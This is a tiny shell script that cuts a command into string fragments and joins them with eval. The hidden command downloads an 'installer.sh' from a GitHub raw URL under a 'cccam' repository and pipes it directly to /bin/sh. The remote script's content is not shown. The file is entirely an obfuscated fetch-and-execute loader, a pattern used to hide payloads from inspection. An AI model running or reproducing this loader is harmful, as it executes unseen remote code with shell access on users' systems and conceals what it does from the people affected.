z="
";Az='wget';Pz='stal';Qz='ler.';Fz='hubu';Lz='37/c';Nz='/mai';Sz='O - ';Cz='ps:/';Kz='mil2';Tz='| /b';Dz='/raw';Vz='h';Oz='n/in';Hz='onte';Jz='om/e';Gz='serc';Rz='sh -';Ez='.git';Uz='in/s';Iz='nt.c';Mz='ccam';Bz=' htt';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz"

